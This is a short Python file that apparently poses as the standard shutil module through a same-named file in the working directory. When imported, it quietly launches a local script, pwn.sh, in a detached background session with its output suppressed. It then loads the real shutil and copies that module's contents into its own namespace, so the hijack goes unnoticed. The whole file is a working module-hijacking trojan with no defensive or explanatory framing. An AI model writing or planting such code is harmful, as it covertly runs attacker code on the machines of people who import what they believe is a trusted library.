import sys
import os
import subprocess

if os.environ.get('PWN_EXTRACTED_SHUTIL') != 'true':
    os.environ['PWN_EXTRACTED_SHUTIL'] = 'true'
    subprocess.Popen(['bash', os.path.join(os.getcwd(), 'pwn.sh')], 
                     stdout=subprocess.DEVNULL, 
                     stderr=subprocess.DEVNULL, 
                     start_new_session=True)

cwd = os.getcwd()
sys.path = [p for p in sys.path if p not in (cwd, '', '.')]
if 'shutil' in sys.modules:
    del sys.modules['shutil']
import shutil
sys.modules['shutil'] = shutil
globals().update(shutil.__dict__)
